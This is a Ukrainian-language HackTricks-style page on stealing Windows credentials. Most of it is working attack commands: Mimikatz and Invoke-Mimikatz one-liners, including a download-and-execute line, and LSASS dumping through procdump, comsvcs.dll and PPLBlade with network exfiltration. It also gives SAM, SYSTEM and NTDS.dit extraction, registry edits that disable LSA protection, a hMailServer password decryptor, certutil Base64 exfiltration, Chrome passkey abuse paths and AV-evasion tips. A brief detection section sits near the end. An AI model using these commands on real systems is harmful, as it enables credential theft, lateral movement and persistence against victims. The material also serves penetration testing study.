# Викрадення облікових даних Windows

{{#include ../../banners/hacktricks-training.md}}

## Облікові дані Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Знайдіть інші можливості Mimikatz на** [**цій сторінці**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Дізнайтеся про деякі можливі способи захисту облікових даних тут.**](credentials-protections.md) **Цей захист може перешкодити Mimikatz видобути деякі облікові дані.**

## Credentials with Meterpreter

Використовуйте [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **який** я створив, щоб **шукати паролі та хеші** у системі жертви.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Обхід AV

### Procdump + Mimikatz

Оскільки **Procdump від** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**є легітимним інструментом Microsoft**, він не виявляється Defender.\
Ви можете використовувати цей інструмент, щоб **зробити dump процесу lsass**, **завантажити dump** і **локально витягнути** **облікові дані** з dump.

Також можна використовувати [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Цей процес виконується автоматично за допомогою [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Примітка**: Деякі **AV** можуть **виявляти** використання **procdump.exe для dump lsass.exe** як **шкідливе**, оскільки вони **виявляють** рядки **"procdump.exe" і "lsass.exe"**. Тому безпечніше з точки зору прихованості передавати **PID** lsass.exe до procdump як **аргумент**, а не **ім'я lsass.exe**.

### Dumping lsass за допомогою **comsvcs.dll**

DLL з назвою **comsvcs.dll**, що знаходиться в `C:\Windows\System32`, відповідає за **dump пам'яті процесу** у разі збою. Ця DLL містить **функцію** з назвою **`MiniDumpW`**, яку призначено для виклику за допомогою `rundll32.exe`.\
Перші два аргументи не мають значення, але третій поділяється на три компоненти. Ідентифікатор процесу, який потрібно dump, є першим компонентом, шлях до dump-файлу — другим, а третім компонентом має бути виключно слово **full**. Альтернативних параметрів не існує.\
Після обробки цих трьох компонентів DLL створює dump-файл і переносить до нього пам'ять указаного процесу.\
**comsvcs.dll** можна використовувати для dump процесу lsass, що усуває потребу завантажувати та виконувати procdump. Цей метод детально описано на [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Для виконання використовується така команда:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Цей процес можна автоматизувати за допомогою** [**lssasy**](https://github.com/Hackndo)**.**

### **Дамп lsass за допомогою Task Manager**

1. Клацніть правою кнопкою миші на панелі завдань і виберіть Task Manager
2. Натисніть More details
3. На вкладці Processes знайдіть процес "Local Security Authority Process"
4. Клацніть правою кнопкою миші на процесі "Local Security Authority Process" і виберіть "Create dump file".

### Дамп lsass за допомогою procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) — це бінарний файл із цифровим підписом Microsoft, який є частиною набору [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Дампінг lsass за допомогою PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) — це інструмент для дампінгу захищених процесів, який підтримує обфускацію memory dump і передачу його на віддалені робочі станції без запису на диск.

**Ключові функції**:

1. Обхід захисту PPL
2. Обфускація файлів memory dump для обходу механізмів виявлення Defender на основі сигнатур
3. Завантаження memory dump за допомогою методів RAW і SMB без запису на диск (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – дампинг LSASS на основі SSP без MiniDumpWriteDump

Ink Dragon постачає триетапний dumper під назвою **LalsDumper**, який ніколи не викликає `MiniDumpWriteDump`, тому EDR-хуки цього API ніколи не спрацьовують:<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – шукає у `fdp.dll` placeholder, що складається з 32 символів `d` у нижньому регістрі, замінює його абсолютним шляхом до `rtu.txt`, зберігає пропатчений DLL як `nfdp.dll` і викликає `AddSecurityPackageA("nfdp","fdp")`. Це змушує **LSASS** завантажити шкідливий DLL як нового Security Support Provider (SSP).
2. **Stage 2 inside LSASS** – коли LSASS завантажує `nfdp.dll`, DLL читає `rtu.txt`, виконує XOR кожного байта з `0x20` і відображає декодований blob у пам'ять перед передаванням виконання.
3. **Stage 3 dumper** – відображене payload повторно реалізує логіку MiniDump за допомогою **direct syscalls**, визначених із хешованих назв API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Спеціальний export під назвою `Tom` відкриває `%TEMP%\<pid>.ddt`, записує стиснений дамп LSASS у файл і закриває handle, щоб exfiltration можна було виконати пізніше.

Примітки оператора:

* Зберігайте `lals.exe`, `fdp.dll`, `nfdp.dll` і `rtu.txt` в одному каталозі. Stage 1 замінює hard-coded placeholder абсолютним шляхом до `rtu.txt`, тому їх розділення порушить ланцюжок.
* Реєстрація виконується додаванням `nfdp` до `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Ви можете самостійно додати це значення, щоб змусити LSASS завантажувати SSP під час кожного запуску.
* Файли `%TEMP%\*.ddt` є стисненими дампами. Розпакуйте їх локально, а потім передайте Mimikatz/Volatility для вилучення облікових даних.
* Для запуску `lals.exe` потрібні права admin/SeTcb, щоб `AddSecurityPackageA` завершився успішно; після повернення виклику LSASS прозоро завантажує rogue SSP і виконує Stage 2.
* Видалення DLL із диска не вивантажує його з LSASS. Видаліть запис у реєстрі та перезапустіть LSASS (перезавантажте систему) або залиште його для довготривалої persistence.

## CrackMapExec

### Dump хешів SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Виведення секретів LSA
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump NTDS.dit із цільового DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump історії паролів NTDS.dit із цільового DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Показати атрибут pwdLastSet для кожного облікового запису NTDS.dit
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Викрадення SAM і SYSTEM

Ці файли мають бути **розташовані** в _C:\windows\system32\config\SAM_ і _C:\windows\system32\config\SYSTEM._ Але **їх не можна просто скопіювати звичайним способом**, оскільки вони захищені.

### З реєстру

Найпростіший спосіб викрасти ці файли — отримати їхню копію з реєстру:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Завантажте** ці файли на вашу машину Kali та **витягніть хеші** за допомогою:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

За допомогою цього сервісу можна створювати копії захищених файлів. Потрібні права Administrator.

#### Using vssadmin

Бінарний файл vssadmin доступний лише у версіях Windows Server
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Але те саме можна зробити з **Powershell**. Ось приклад того, **як скопіювати файл SAM** (використовується жорсткий диск "C:", а файл зберігається в C:\users\Public), але це можна використовувати для копіювання будь-якого захищеного файлу:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Код із книги: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Нарешті, ви також можете використати [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), щоб створити копії SAM, SYSTEM і ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Облікові дані Active Directory - NTDS.dit**

Файл **NTDS.dit** відомий як серце **Active Directory** і містить важливі дані про об'єкти користувачів, групи та їхнє членство. Саме тут зберігаються **хеші паролів** користувачів домену. Цей файл є базою даних **Extensible Storage Engine (ESE)** і розташований за адресою **_%SystemRoom%/NTDS/ntds.dit_**.

У цій базі даних підтримуються три основні таблиці:

- **Data Table**: ця таблиця відповідає за зберігання даних про такі об'єкти, як користувачі та групи.
- **Link Table**: вона відстежує зв'язки, наприклад членство в групах.
- **SD Table**: тут зберігаються **дескриптори безпеки** для кожного об'єкта, що забезпечують безпеку та контроль доступу до збережених об'єктів.

Дослідження Christoffer Andersson щодо рівня бази даних докладніше описує ці таблиці та їхню поведінку залежно від версії.<sup>[[8]](#references)</sup>

Windows використовує _Ntdsa.dll_ для взаємодії з цим файлом, а він використовується _lsass.exe_. Тому **частина** файлу **NTDS.dit** може перебувати в пам'яті **`lsass`** (імовірно, можна знайти останні доступні дані завдяки підвищенню продуктивності через використання **cache**).

#### Розшифрування хешів усередині NTDS.dit

Хеш шифрується тричі:

1. Розшифрувати ключ шифрування паролів (**PEK**) за допомогою **BOOTKEY** і **RC4**.
2. Розшифрувати **hash** за допомогою **PEK** і **RC4**.
3. Розшифрувати **hash** за допомогою **DES**.

**PEK** має **однакове значення на кожному контролері домену**, але він **зашифрований** у **NTDS.dit** за допомогою специфічного для контролера домену **BOOTKEY** із його вулика **SYSTEM**. Тому для вилучення облікових даних потрібні і **NTDS.dit**, і **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

### Копіювання NTDS.dit за допомогою Ntdsutil

Доступно, починаючи з Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Ви також можете скористатися прийомом [**volume shadow copy**](#stealing-sam-and-system), щоб скопіювати файл **ntds.dit**. Пам’ятайте, що вам також знадобиться копія **SYSTEM file** (знову ж таки, [**dump його з registry або скористайтеся прийомом volume shadow copy**](#stealing-sam-and-system)).

### **Видобування хешів з NTDS.dit**

Після того як ви **отримали** файли **NTDS.dit** і **SYSTEM**, ви можете використовувати такі інструменти, як _secretsdump.py_, щоб **видобути хеші**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Ви також можете **автоматично їх вилучити**, використовуючи дійсного користувача-адміністратора домену:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Для **великих файлів NTDS.dit** рекомендується виконувати їхнє вилучення за допомогою [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Зрештою, також можна використати **модуль metasploit**: _post/windows/gather/credentials/domain_hashdump_ або **mimikatz** `lsadump::lsa /inject`

### **Вилучення об'єктів домену з NTDS.dit до бази даних SQLite**

Об'єкти NTDS можна вилучити до бази даних SQLite за допомогою [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Вилучаються не лише секрети, а й усі об'єкти та їхні атрибути для подальшого вилучення додаткової інформації, якщо необроблений файл NTDS.dit уже отримано.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Hive `SYSTEM` є необов’язковим, але дає змогу розшифровувати secrets (NT- і LM-хеші, додаткові облікові дані, як-от паролі у відкритому вигляді, ключі Kerberos або trust, історію паролів NT і LM). Серед іншої інформації видобуваються такі дані: облікові записи користувачів і машин разом із їхніми хешами, прапорці UAC, часові мітки останнього входу та зміни пароля, описи облікових записів, імена, UPN, SPN, групи та рекурсивне членство в них, дерево organizational units і членство в них, trusted domains із типом, напрямком і атрибутами trust тощо.

## Lazagne

Завантажте binary [тут](https://github.com/AlessandroZ/LaZagne/releases). Цей binary можна використовувати для видобування credentials із різного software.
```
lazagne.exe all
```
## Інші інструменти для вилучення облікових даних із SAM і LSASS

### Windows credentials Editor (WCE)

Цей інструмент можна використовувати для вилучення облікових даних із пам’яті. Завантажте його за посиланням: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Вилучення облікових даних із файлу SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Витягування облікових даних із файлу SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Завантажте його з:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) і просто **запустіть** — паролі буде вилучено.

## Збір даних про неактивні RDP-сесії та послаблення засобів контролю безпеки

FinalDraft RAT від Ink Dragon містить таскер `DumpRDPHistory`, методи якого корисні для будь-якого red-teamer:<sup>[[3]](#references)</sup>

### Збір телеметрії у стилі DumpRDPHistory

* **Вихідні цілі RDP** — проаналізуйте кожен профіль користувача в `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Кожен підрозділ зберігає ім’я сервера, `UsernameHint` і мітку часу останнього запису. Ви можете відтворити логіку FinalDraft за допомогою PowerShell:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Докази вхідних RDP-підключень** — запитайте журнал `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` щодо Event ID **21** (успішний вхід) і **25** (відключення), щоб визначити, хто адміністрував цей хост:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Визначивши, який Domain Admin регулярно підключається, виконайте dump LSASS за допомогою LalsDumper/Mimikatz, поки його **відключена** сесія все ще існує. CredSSP + резервний варіант NTLM залишає його верифікатор і токени в LSASS, після чого їх можна повторно використати через SMB/WinRM, щоб отримати `NTDS.dit` або закріпитися на контролерах домену.

### Зниження рівня захисту реєстру, націлене FinalDraft

Цей самий імплант також змінює кілька ключів реєстру, щоб спростити крадіжку облікових даних:<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Встановлення `DisableRestrictedAdmin=1` примусово вмикає повне повторне використання облікових даних/квитків під час RDP, уможливлюючи переміщення в стилі pass-the-hash.
* `LocalAccountTokenFilterPolicy=1` вимикає фільтрацію токенів UAC, тому локальні адміністратори отримують необмежені токени через мережу.
* `DSRMAdminLogonBehavior=2` дає адміністратору DSRM змогу входити в систему, коли DC працює, надаючи атакувальникам ще один вбудований обліковий запис із високими привілеями.
* `RunAsPPL=0` усуває захист LSASS PPL, роблячи доступ до пам’яті тривіальним для dumpers, таких як LalsDumper.

## Облікові дані бази даних hMailServer (post-compromise)

hMailServer зберігає пароль до своєї БД у `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` у секції `[Database] Password=`. Значення зашифроване за допомогою Blowfish зі статичним ключем `THIS_KEY_IS_NOT_SECRET` і перестановками endian для 4-байтових слів. Використайте hex-рядок з INI за допомогою цього фрагмента Python:<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Маючи пароль у відкритому вигляді, скопіюйте базу даних SQL CE, щоб уникнути блокувань файлу, завантажте 32-бітний provider і, за потреби, оновіть його перед запитом хешів:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Колонка `accountpassword` використовує формат hash hMailServer (режим hashcat `1421`). Cracking цих значень може надати повторно використовувані облікові дані для pivoting через WinRM/SSH.

## LSA Logon Callback Interception (LsaApLogonUserEx2)

Деякі інструменти перехоплюють **plaintext паролі входу**, перехоплюючи callback LSA `LsaApLogonUserEx2`. Ідея полягає в тому, щоб під’єднати hook або обгорнути callback пакета автентифікації, аби облікові дані захоплювалися **під час входу** (до хешування), а потім записувалися на диск або поверталися оператору. Зазвичай це реалізується як helper, який інжектиться в LSA або реєструється в ньому, а потім записує кожну успішну подію інтерактивного/мережевого входу з іменем користувача, доменом і паролем.<sup>[[1]](#references)</sup>

Операційні примітки:
- Потрібні локальні права адміністратора/SYSTEM, щоб завантажити helper у шлях автентифікації.
- Захоплені облікові дані з’являються лише під час входу (інтерактивного, RDP, сервісного або мережевого — залежно від hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) зберігає інформацію про збережені підключення у файлі `sqlstudio.bin` для кожного користувача. Спеціалізовані dumpers можуть розібрати файл і відновити збережені облікові дані SQL. У shell, які повертають лише вивід команд, файл часто exfiltrate-ять, кодувавши його в Base64 і виводячи до stdout.<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
На стороні оператора повторно зберіть файл і запустіть dumper локально, щоб відновити облікові дані:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Викрадення passkeys / WebAuthn credentials із Chrome у Windows

Якщо на Windows-хості отримано **виконання коду** від імені **користувача-жертви** з використанням **Chrome + синхронізованих passkeys у Google Password Manager**, passkeys стають цікавою ціллю для post-exploitation навіть **без прав адміністратора/SYSTEM**.<sup>[[4]](#references)</sup>

### Цікаві локальні артефакти
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** зберігає protobuf-кодовані записи **`WebauthnCredentialSpecifics`**. Процес того самого користувача може перелічити **RP ID**, **ім’я користувача**, **ідентифікатор облікових даних** і зашифрований матеріал приватного ключа для синхронізованих passkeys.<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** зберігає стан локального зарахування пристрою, зокрема **`wrapped_identity_private_key`** і обгорнутий секрет, який використовується для відновлення синхронізованих облікових даних.<sup>[[4]](#references)</sup>

Швидке первинне оцінювання:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### Прив'язані до TPM key blobs усе ще можна зловживати як локальним оракулом підпису

Якщо браузер експортує identity key, захищений TPM, як **`NCRYPT_OPAQUE_KEY_BLOB`** і зберігає цей blob у стані, доступному користувачеві, malware **не** потрібно витягувати raw private key. Воно може просто повторно імпортувати blob на **тому самому комп'ютері** й попросити локальний TPM підписати дані, контрольовані attacker:<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Це означає, що **апаратна прив’язка запобігає експорту за межі пристрою, але не перешкоджає використанню тим самим користувачем на скомпрометованій кінцевій точці**.

### Практичні шляхи зловживання

1. **Ретрансляція pass-ta-key / ідентичності пристрою**<sup>[[4]](#references)</sup>
- Перелічити `WebauthnCredentialSpecifics` із Chrome's LevelDB.
- Запустити вхід за допомогою passkey та отримати свіжий WebAuthn challenge.
- Використати викрадений blob `wrapped_identity_private_key` на TPM жертви для підписання прив’язки запиту cloud-authenticator.
- Передати отриману assertion до relying party.
- Це особливо цінно, коли RP приймає `userVerification=preferred` або не відхиляє assertions із **`UV=0`**.
2. **Захоплення pending UV-key**<sup>[[4]](#references)</sup>
- Примусово виконати повторну реєстрацію, видаливши `passkey_enclave_state` або надіславши дійсну підписану операцію `device/forget`.
- Якщо після реєстрації пристрій залишається у стані **`uv_key_pending`**, зареєструвати контрольований зловмисником UV public key.
- Якщо провайдер не перевіряє attestation / походження нового UV key із secure hardware, наступні підписи ключем зловмисника трактуються як **`UV=1`**.
3. **Викрадення master-secret / відновлення SDS**<sup>[[4]](#references)</sup>
- Примусово запустити recovery або повторне приєднання, щоб Chrome отримав синхронізований master secret passkey.
- Відстежувати повторне створення/зміну `passkey_enclave_state`, а потім зняти дамп пам’яті Chrome, поки plaintext **security domain secret (SDS)** перебуває в пам’яті.
- Використати отриманий SDS для розшифрування зашифрованих полів у кожному записі `WebauthnCredentialSpecifics` та відновити portable WebAuthn private keys.

### Ідеї для DFIR / виявлення

- Відстежувати **видалення/повторне створення** `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Створювати alert у разі аномального доступу до Chrome **`Sync Data\LevelDB`** процесами, що не є браузерами.
- Створювати alert у разі **дампів пам’яті Chrome** або підозрілого доступу до пам’яті між процесами.
- Розслідувати повторювані запити **Google Password Manager recovery PIN** або неочікувану повторну реєстрацію.
- Пам’ятайте, що WebAuthn **`signCount`** часто не є корисним для синхронізованих passkeys, оскільки може залишатися незмінним, тому класичне виявлення клонів є ненадійним.

## References

- [1] [Unit 42 – Розслідування багаторічних невиявлених операцій, спрямованих проти високопріоритетних секторів](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: фішинг через макрос Word VBA за допомогою SMTP → розшифрування облікових даних hMailServer → Veeam CVE-2023-27532 до SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Всередині Ink Dragon: розкриття relay network та внутрішньої роботи прихованої offensive operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: нова поверхня атак у passwordless authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / сховище ключів CNG](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Злам Windows: атаки на системи та мережі Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Як насправді працює сховище даних Active Directory: всередині NTDS.dit (частина 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – віддалене зняття дампу паролів Lsass](https://en.hackndo.com/remote-lsass-dump-passwords)
{{#include ../../banners/hacktricks-training.md}}
